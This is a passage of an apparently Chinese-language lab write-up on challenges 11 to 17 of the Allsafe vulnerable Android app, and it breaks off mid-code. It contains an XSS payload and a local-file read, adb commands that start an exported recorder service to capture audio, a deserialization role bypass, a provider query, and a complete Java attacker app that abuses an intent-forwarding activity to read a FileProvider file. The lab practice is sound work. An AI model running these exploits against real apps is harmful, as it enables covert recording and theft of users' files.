+<h1 id="11-Vulnerable-WebView-易受攻击的-WebView"><a href="#11-Vulnerable-WebView-易受攻击的-WebView" class="headerlink" title="11 Vulnerable WebView(易受攻击的 WebView)"></a>11 Vulnerable WebView(易受攻击的 WebView)</h1><h2 id="11-1-漏洞复现"><a href="#11-1-漏洞复现" class="headerlink" title="11.1 漏洞复现"></a>11.1 漏洞复现</h2><p>WebView是App中的一个核心组件，简单来说就是一个内置的浏览器</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;Img/Src/OnError=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758781541713-3f06abb2-f0c7-4601-922b-0d7bb5a3f916.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">file:<span class="hljs-comment">///etc/hosts</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758781562218-58bc0399-06b6-4b02-a3b7-97bf5a2be778.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758781663165-2a1b0278-0179-435f-acb6-faff40bf357d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>定位到该靶场的代码进行分析可以看到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758781798950-3e9ba323-6253-4889-857d-541b933751a1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以发现该 WebView 即允许 JavaScript 也允许本地文件访问；因此导致了 XSS 漏洞和 SSRF 漏洞的产生；</p>
+<h2 id="11-2-漏洞总结"><a href="#11-2-漏洞总结" class="headerlink" title="11.2 漏洞总结"></a>11.2 漏洞总结</h2><p>这个漏洞就与 Web 的基础漏洞及其的相似了，按照 Web 漏洞的测试方法进行测试即可；</p>
+<h1 id="12-certificate-Pinning-证书锁定"><a href="#12-certificate-Pinning-证书锁定" class="headerlink" title="12 certificate Pinning(证书锁定)"></a>12 certificate Pinning(证书锁定)</h1><h2 id="12-1-漏洞复现"><a href="#12-1-漏洞复现" class="headerlink" title="12.1 漏洞复现"></a>12.1 漏洞复现</h2><p>直接把 bp 的证书安装到系统证书目录即可；能够通过这种方法解决的问题，基本上都不算问题；</p>
+<p>因此不打算再这个问题上进行深入研究，还有其他的方法能够解决这个问题。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758782685063-589241ba-2fc9-43bb-91f6-00b6c188d51b.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="12-2-漏洞总结"><a href="#12-2-漏洞总结" class="headerlink" title="12.2 漏洞总结"></a>12.2 漏洞总结</h2><p>证书安装的问题，安装到系统目录即可；当然还有一些其他的情况，即使证书安装了依旧无法正常抓包，这是就需要通过别的手段进行 bypass 了，这个后面再做研究进行分享。</p>
+<h1 id="13-Weak-Cryptography-弱密码学"><a href="#13-Weak-Cryptography-弱密码学" class="headerlink" title="13 Weak Cryptography(弱密码学)"></a>13 Weak Cryptography(弱密码学)</h1><p>这题也是再考察 hook 方法的内容，之前写了不少了，不想写了，就这样吧，而且就算是考察逆向加密方法获取加密密钥等内容也是比较容易的，源码里边也有；所以这个跳过吧。s</p>
+<h1 id="14-Insecure-Service-不安全的服务"><a href="#14-Insecure-Service-不安全的服务" class="headerlink" title="14 Insecure Service(不安全的服务)"></a>14 Insecure Service(不安全的服务)</h1><h2 id="14-1-漏洞复现"><a href="#14-1-漏洞复现" class="headerlink" title="14.1 漏洞复现"></a>14.1 漏洞复现</h2><p>Service是Android的四大组件之一，是实现程序后台运行的解决方案，适合执行不需要和用户交互而且还要求长期运行的任务，但Service并不是运行在一个独立的进程当中的，而是依赖于创建Service时所在的应用程序进程。而且Service并不会自动开启线程，所有的代码都是默认运行在主线程当中。</p>
+<p>在当前环境中的问题在于该服务是对外暴露的，即允许 <strong>其他应用程序（不同包名的 App）</strong> 通过 Intent 调用或绑定这个组件。</p>
+<p>因此攻击者可以触发靶场 App 内的 Service 来开始录音（Service 在靶场进程中运行，使用靶场 App 的权限和上下文），录下环境音&#x2F;用户对话。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758788845889-1dc7e107-637f-43c1-8b74-243a4ca269ea.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758788923162-1063d8fa-2426-48ca-bd54-b8b53c2c11e8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 尝试启动（用完整类名）</span><br>adb shell am startservice -n infosecadventures.allsafe/infosecadventures.allsafe.challenges.RecorderService<br><span class="hljs-comment"># 或短写（取决于 manifest）</span><br>adb shell am startservice -n infosecadventures.allsafe/.challenges.RecorderService<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 6); <span class="hljs-keyword">do</span><br>  adb shell am startservice -n infosecadventures.allsafe/.challenges.RecorderService<br>  <span class="hljs-built_in">sleep</span> 2<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>这里按道理来说应该是有一个 flag 的，但是我死活没找到，大哥们教教我</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758793515297-ed14fa46-dcbe-4f21-a91f-a98e89f2b1f5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="14-2-漏洞总结"><a href="#14-2-漏洞总结" class="headerlink" title="14.2 漏洞总结"></a>14.2 漏洞总结</h2><p>对于此类漏洞针对与服务中是否存在一些错误配置</p>
+<ol>
+<li>解析 AndroidManifest，定位 <code>Service</code>：关注 <code>android:exported</code>、<code>intent-filter</code>、<code>android:permission</code>；反编译查看服务实现是否有敏感操作或写公共目录。  </li>
+<li>用 <code>adb shell am startservice</code> &#x2F; <code>bindservice</code> 触发服务；用 logcat、文件系统检查结果（&#x2F;sdcard&#x2F;Download 等）。  </li>
+<li>传入不同 extras、循环触发以绕过短时限制、拉取产出文件做证据。</li>
+</ol>
+<h1 id="15-Object-Serialization-对象序列化"><a href="#15-Object-Serialization-对象序列化" class="headerlink" title="15 Object Serialization(对象序列化)"></a>15 Object Serialization(对象序列化)</h1><h2 id="15-1-漏洞复现"><a href="#15-1-漏洞复现" class="headerlink" title="15.1 漏洞复现"></a>15.1 漏洞复现</h2><p>这个环境中主要存在的问题是数据本地存储和对象序列化问题，由于数据本地存储，因此我们可以实现对数据的任意修改；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> infosecadventures.allsafe.challenges;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.text.Editable;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> android.view.LayoutInflater;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.view.ViewGroup;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><span class="hljs-keyword">import</span> androidx.fragment.app.Fragment;<br><span class="hljs-keyword">import</span> com.google.android.material.textfield.TextInputEditText;<br><span class="hljs-keyword">import</span> infosecadventures.allsafe.C1679R;<br><span class="hljs-keyword">import</span> infosecadventures.allsafe.utils.SnackUtil;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-comment">/* loaded from: classes4.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectSerialization</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fragment</span> &#123;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// androidx.fragment.app.Fragment</span><br>    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> inflater.inflate(C1679R.layout.fragment_object_serialization, container, <span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">TextInputEditText</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> (TextInputEditText) view.findViewById(C1679R.id.username);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">TextInputEditText</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> (TextInputEditText) view.findViewById(C1679R.id.password);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">save</span> <span class="hljs-operator">=</span> (Button) view.findViewById(C1679R.id.save);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">load</span> <span class="hljs-operator">=</span> (Button) view.findViewById(C1679R.id.load);<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> requireActivity().getExternalFilesDir(<span class="hljs-literal">null</span>) + <span class="hljs-string">&quot;/user.dat&quot;</span>;<br>        save.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123; <span class="hljs-comment">// from class: infosecadventures.allsafe.challenges.ObjectSerialization$$ExternalSyntheticLambda0</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.view.View.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view2)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-built_in">this</span>.f$<span class="hljs-number">0.</span>lambda$onCreateView$<span class="hljs-number">0</span>(username, password, path, view2);<br>            &#125;<br>        &#125;);<br>        load.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() &#123; <span class="hljs-comment">// from class: infosecadventures.allsafe.challenges.ObjectSerialization$$ExternalSyntheticLambda1</span><br>            <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.view.View.OnClickListener</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view2)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                <span class="hljs-built_in">this</span>.f$<span class="hljs-number">0.</span>lambda$onCreateView$<span class="hljs-number">1</span>(path, view2);<br>            &#125;<br>        &#125;);<br>        <span class="hljs-keyword">return</span> view;<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: private */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-comment">/* synthetic */</span> <span class="hljs-keyword">void</span> lambda$onCreateView$<span class="hljs-number">0</span>(TextInputEditText username, TextInputEditText password, String path, View v) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (!((Editable) Objects.requireNonNull(username.getText())).toString().isEmpty() &amp;&amp; !((Editable) Objects.requireNonNull(password.getText())).toString().isEmpty()) &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(username.getText().toString(), password.getText().toString());<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>                <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>                <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>                oos.writeObject(user);<br>                oos.close();<br>                fos.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                Log.d(<span class="hljs-string">&quot;ALLSAFE&quot;</span>, e.getLocalizedMessage());<br>            &#125;<br>            SnackUtil.INSTANCE.simpleMessage(requireActivity(), <span class="hljs-string">&quot;User data successfully saved!&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        SnackUtil.INSTANCE.simpleMessage(requireActivity(), <span class="hljs-string">&quot;Fill out the fields!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: private */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-comment">/* synthetic */</span> <span class="hljs-keyword">void</span> lambda$onCreateView$<span class="hljs-number">1</span>(String path, View v) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path).exists()) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>                <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file);<br>                <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>                <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) ois.readObject();<br>                ois.close();<br>                fis.close();<br>                <span class="hljs-keyword">if</span> (!user.role.equals(<span class="hljs-string">&quot;ROLE_EDITOR&quot;</span>)) &#123;<br>                    SnackUtil.INSTANCE.simpleMessage(requireActivity(), <span class="hljs-string">&quot;Sorry, only editors have access!&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    SnackUtil.INSTANCE.simpleMessage(requireActivity(), <span class="hljs-string">&quot;Good job!&quot;</span>);<br>                    Toast.makeText(requireContext(), user.toString(), <span class="hljs-number">0</span>).show();<br>                &#125;<br>                <span class="hljs-keyword">return</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>                Log.d(<span class="hljs-string">&quot;ALLSAFE&quot;</span>, e.getLocalizedMessage());<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>        SnackUtil.INSTANCE.simpleMessage(requireActivity(), <span class="hljs-string">&quot;File not found!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        String password;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">role</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ROLE_AUTHOR&quot;</span>;<br>        String username;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String username, String password)</span> &#123;<br>            <span class="hljs-built_in">this</span>.username = username;<br>            <span class="hljs-built_in">this</span>.password = password;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;username=&#x27;&quot;</span> + <span class="hljs-built_in">this</span>.username + <span class="hljs-string">&quot;&#x27;, password=&#x27;&quot;</span> + <span class="hljs-built_in">this</span>.password + <span class="hljs-string">&quot;&#x27;, role=&#x27;&quot;</span> + <span class="hljs-built_in">this</span>.role + <span class="hljs-string">&quot;&#x27;&#125;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>final String path = requireActivity().getExternalFilesDir(null) + &quot;/user.dat&quot;;</code>所指的位置是<code>/storage/emulated/0/Android/data/infosecadventures.allsafe/files/user.dat</code>，因此我们可以通过 java 重新生成相应的序列化文件，并且将相应的角色修改为<code>ROLE_EDITOR</code>，从而实现绕过其角色检测；</p>
+<p>有一点 Java 反序列化基础的应该都会了，这里就不继续深入了（本人太懒了）</p>
+<h2 id="15-2-漏洞总结"><a href="#15-2-漏洞总结" class="headerlink" title="15.2 漏洞总结"></a>15.2 漏洞总结</h2><p>比较类似于 java 反序列化，还有存在 Java 反序列化 rce 的可能性；</p>
+<h1 id="16-Insecure-Providers-不安全的提供者"><a href="#16-Insecure-Providers-不安全的提供者" class="headerlink" title="16 Insecure Providers(不安全的提供者)"></a>16 Insecure Providers(不安全的提供者)</h1><h2 id="16-1-漏洞复现"><a href="#16-1-漏洞复现" class="headerlink" title="16.1 漏洞复现"></a>16.1 漏洞复现</h2><p>通过<code>DataProvider</code>类定位到此处可以发现该类为导出的，直接可供外部应用查询；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758801864587-23fd4f35-e47c-4294-8fc7-86dcb2efe253.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>直接通过<code>adb</code>即可查询</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">adb shell content query --uri <span class="hljs-string">&quot;content://infosecadventures.allsafe.dataprovider&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758801968404-634f1cea-caa1-4092-a2a6-590e96988eab.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><code>FileProvider</code> 把 app 内&#x2F;外部文件暴露为 <code>content://</code> URI 且 <code>grantUriPermissions=&quot;true&quot;</code>；<code>ProxyActivity</code> 会直接 <code>startActivity( (Intent) getIntent().getParcelableExtra(&quot;extra_intent&quot;) )</code> 。如果你能向 <code>ProxyActivity</code> 传入一个<strong>包含可读</strong> <code>**content://**</code> <strong>URI 且带有授权标志</strong>的内层 Intent，目标 App 会以自己的身份去启动该 Intent，从而可能访问&#x2F;泄露该 <code>content://</code> 指向的文件或唤起处理该 URI 的组件（实现文件读取&#x2F;信息泄露或跨组件滥用）  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1758802078559-b453d3eb-dbdb-4960-bcf6-2fbc57480529.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>具体实现方法如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.ip4fileprovider;<br><br><span class="hljs-keyword">import</span> android.content.ComponentName;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.net.Uri;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><br><span class="hljs-keyword">import</span> androidx.annotation.Nullable;<br><span class="hljs-keyword">import</span> androidx.appcompat.app.AppCompatActivity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TARGET_PACKAGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;infosecadventures.allsafe&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TARGET_PROXY_ACTIVITY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;infosecadventures.allsafe.ProxyActivity&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONTENT_URI</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;content://infosecadventures.allsafe.fileprovider/files/docs/readme.txt&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-built_in">this</span>);<br>        button.setText(<span class="hljs-string">&quot;Trigger ProxyActivity&quot;</span>);<br>        setContentView(button);<br><br>        button.setOnClickListener(v -&gt; triggerProxy());<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">triggerProxy</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Intent</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(Intent.ACTION_VIEW);<br>            inner.setData(Uri.parse(CONTENT_URI));<br>            inner.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);<br><br>            <span class="hljs-type">Intent</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>            wrapper.putExtra(<span class="hljs-string">&quot;extra_intent&quot;</span>, inner);<br>            wrapper.setComponent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ComponentName</span>(TARGET_PACKAGE, TARGET_PROXY_ACTIVITY));<br>            startActivity(wrapper);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="16-2-漏洞总结"><a href="#16-2-漏洞总结" class="headerlink" title="16.2 漏洞总结"></a>16.2 漏洞总结</h2><p>本次包含两个类型的漏洞，第一个 DataProvider 纯纯是因为导出组件导致的；第二个主要是由于允许其他应用通过<code>Intent</code>获得资源访问权限以及<code>ProxyActivity</code> 的存在导致的；</p>
+<h1 id="17-Arbitrary-Code-Execution-任意代码执行"><a href="#17-Arbitrary-Code-Execution-任意代码执行" class="headerlink" title="17 Arbitrary Code Execution(任意代码执行)"></a>17 Arbitrary Code Execution(任意代码执行)</h1><h2 id="17-1-漏洞复现"><a href="#17-1-漏洞复现" class="headerlink" title="17.1 漏洞复现"></a>17.1 漏洞复现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArbitraryCodeExecution</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.app.Application</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;<br>        <span class="hljs-built_in">super</span>.onCreate();<br>        AppCompatDelegate.setDefaultNightMode(<span class="hljs-number">2</span>);<br>        invokePlugins();<br>        invokeUpdate();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokePlugins</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;<br>        <span 